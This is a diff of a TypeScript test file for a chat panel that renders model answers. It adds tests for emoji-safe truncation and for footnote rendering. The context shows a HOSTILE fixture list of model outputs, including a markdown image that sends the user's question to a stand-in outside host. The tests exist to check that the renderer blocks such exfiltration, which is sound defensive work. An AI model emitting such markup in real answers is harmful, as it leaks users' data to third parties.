@@ -27,8 +27,10 @@ function renderAnswer(text: string) {
 }
 
 // An answer is model output, and the model has read text the app did not
-// write. Each of these makes today's markdown renderer emit an element that
-// loads or opens an address.
+// write. The first thirteen made the markdown renderer emit an element that
+// loads or opens an address until ChatPanel limited it. The three raw-HTML
+// ones never did (react-markdown shows raw HTML as text): they are here so
+// that a later plugin or option cannot quietly change that.
 const HOSTILE: Array<[string, string]> = [
   ["an image", "Done.\n\n![usage badge](https://badges.outside.example/b.png?d=the-question)"],
   ["a link", "See [the full dataset](https://outside.example/data)."],
@@ -83,6 +85,17 @@ describe("historyTurns", () => {
     const long: ChatMessage[] = [{ id: 1, author: "assistant", text: "x".repeat(20_000) }];
     expect(historyTurns(long)[0].content).toHaveLength(16_000);
   });
+
+  it("never cuts an emoji in half", () => {
+    // The emoji's two UTF-16 units sit on either side of the limit.
+    const text = "x".repeat(15_999) + "😀 and more";
+    const [turn] = historyTurns([{ id: 1, author: "user", text }]);
+    expect(turn.content).toBe("x".repeat(15_999));
+    const whole = "x".repeat(15_998) + "😀 and more";
+    expect(historyTurns([{ id: 1, author: "user", text: whole }])[0].content).toBe(
+      "x".repeat(15_998) + "😀"
+    );
+  });
 });
 
 describe("ChatPanel answers", () => {
@@ -106,6 +119,12 @@ describe("ChatPanel answers", () => {
     const { answer } = renderAnswer("See [the full dataset](https://outside.example/data) first.");
     expect(answer).toHaveTextContent("See the full dataset first.");
     expect(answer).not.toHaveTextContent("outside.example");
+  });
+
+  it("leave no stray arrow where a footnote linked back to the text", () => {
+    const { answer } = renderAnswer("Hunger fell.[^1]\n\n[^1]: By the index's own count.");
+    expect(answer).toHaveTextContent("By the index's own count.");
+    expect(answer).not.toHaveTextContent("↩");
   });
 
   it("keep an address the answer wrote out, as plain text", () => {
